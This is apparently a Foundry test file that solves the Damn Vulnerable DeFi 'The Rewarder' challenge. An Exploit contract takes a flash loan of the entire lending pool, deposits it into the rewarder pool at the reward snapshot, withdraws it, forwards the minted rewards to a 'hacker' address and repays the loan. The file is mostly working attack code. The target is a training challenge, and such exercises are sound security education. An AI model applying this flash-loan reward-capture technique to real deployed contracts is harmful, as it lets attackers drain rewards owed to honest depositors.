// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import {TheRewarderPool} from "src/TheRewarder/TheRewarderPool.sol";
import {FlashLoanerPool} from "src/TheRewarder/FlashLoanerPool.sol";
import {AccountingToken} from "src/TheRewarder/AccountingToken.sol";
import {RewardToken} from "src/TheRewarder/RewardToken.sol";

// Challenge #5 - The Rewarder
// https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/

contract Attack is Test {
    DamnValuableToken public liquidityToken;
    AccountingToken public accountingToken;
    FlashLoanerPool public flashLoanPool;
    RewardToken public rewardToken;
    TheRewarderPool public rewarderPool;

    uint256 public constant TOKENS_IN_LENDER_POOL = 1000000 * 1e18;
    uint256 public constant DEPOSITAMOUNT = 100 * 1e18;
    uint256 public minterRole;
    uint256 public snapshotRole;
    uint256 public burnerRole;

    address public constant ALICE = payable(address(uint160(uint256(keccak256(abi.encodePacked("alice"))))));
    address public constant BOB = payable(address(uint160(uint256(keccak256(abi.encodePacked("bob"))))));
    address public constant CHARLIE = payable(address(uint160(uint256(keccak256(abi.encodePacked("charlie"))))));
    address public constant DAVID = payable(address(uint160(uint256(keccak256(abi.encodePacked("david"))))));
    address[] public users = [ALICE, BOB, CHARLIE, DAVID];

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    function setUp() public {
        liquidityToken = new DamnValuableToken();
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));

        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);

        rewarderPool = new TheRewarderPool(address(liquidityToken));

        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accountingToken();

        minterRole = accountingToken.MINTER_ROLE();
        snapshotRole = accountingToken.SNAPSHOT_ROLE();
        burnerRole = accountingToken.BURNER_ROLE();

        for (uint256 i = 0; i < users.length; i++) {
            liquidityToken.transfer(users[i], DEPOSITAMOUNT);
            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), DEPOSITAMOUNT);
            rewarderPool.deposit(DEPOSITAMOUNT);
            vm.stopPrank();
        }

        assertEq(accountingToken.owner(), address(rewarderPool));
        assertEq(accountingToken.hasAllRoles(address(rewarderPool), minterRole | snapshotRole | burnerRole), true);
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(accountingToken.balanceOf(users[i]), DEPOSITAMOUNT);
        }
        assertEq(accountingToken.totalSupply(), DEPOSITAMOUNT * users.length);
        assertEq(rewardToken.totalSupply(), 0);

        vm.warp(5 * 24 * 60 * 60 + 1);

        for (uint256 i = 0; i < users.length; i++) {
            vm.startPrank(users[i]);
            rewarderPool.distributeRewards();
            vm.stopPrank();

            assertEq(rewardToken.balanceOf(users[i]), rewarderPool.REWARDS() / users.length);
        }

        assertEq(liquidityToken.balanceOf(hacker), 0);
        assertEq(rewarderPool.roundNumber(), 2);
    }

    function testExploit() public {
        // Attack Code:
        Exploit exploit = new Exploit(
            flashLoanPool,
            rewarderPool,
            rewardToken,
            liquidityToken,
            hacker
        );
        vm.warp(10 * 24 * 60 * 60 + 1);
        liquidityToken.approve(address(rewarderPool), 170);
        exploit.getLoan();

        assertEq(rewarderPool.roundNumber(), 3);
        for (uint256 i = 0; i < users.length; i++) {
            vm.startPrank(users[i]);
            rewarderPool.distributeRewards();
            vm.stopPrank();

            uint256 userRewards = rewardToken.balanceOf(users[i]);
            uint256 delta = userRewards - (rewarderPool.REWARDS() / users.length);
            assertLt(delta, 1e16);
        }
        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
        uint256 hackerRewards = rewardToken.balanceOf(hacker);
        assertGt(hackerRewards, 0);
        assertLt(rewarderPool.REWARDS() - hackerRewards, 1e17);
        assertEq(liquidityToken.balanceOf(hacker), 0);
        assertEq(liquidityToken.balanceOf(address(flashLoanPool)), TOKENS_IN_LENDER_POOL);
    }
}

contract Exploit {
    FlashLoanerPool public loan;
    TheRewarderPool public pool;
    RewardToken public reward;
    DamnValuableToken public liquidity;
    address public hacker;

    constructor(
        FlashLoanerPool _loan,
        TheRewarderPool _pool,
        RewardToken _reward,
        DamnValuableToken _liquidity,
        address _hacker
    ) {
        loan = _loan;
        pool = _pool;
        reward = _reward;
        liquidity = _liquidity;
        hacker = _hacker;
    }

    function getLoan() public {
        loan.flashLoan(liquidity.balanceOf(address(loan)));
    }

    function receiveFlashLoan(uint256 _amount) public {
        require(liquidity.balanceOf(address(this)) == _amount, "Get loan failed");
        liquidity.approve(address(pool), _amount);
        pool.deposit(_amount);
        pool.withdraw(_amount);
        uint256 hackerReward = reward.balanceOf(address(this));
        require(hackerReward > 0, "Get rewards failed");
        reward.transfer(hacker, hackerReward);
        liquidity.transfer(address(loan), _amount);
    }
}
